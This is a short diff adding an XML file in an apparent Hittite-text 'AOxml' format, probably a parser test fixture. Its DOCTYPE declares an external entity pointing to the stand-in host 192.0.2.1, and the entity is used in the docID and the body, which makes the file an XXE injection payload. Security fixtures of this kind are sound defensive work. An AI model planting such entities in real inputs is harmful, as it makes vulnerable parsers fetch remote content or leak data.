@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE AOxml [ <!ENTITY out SYSTEM "http://192.0.2.1/pull"> ]>
+<AOxml xmlns:AO="http://hethiter.net/ns/AO/1.0"><AOHeader><docID>&out;</docID></AOHeader><body><text><l lg="Hit"/>&out;</text></body></AOxml>
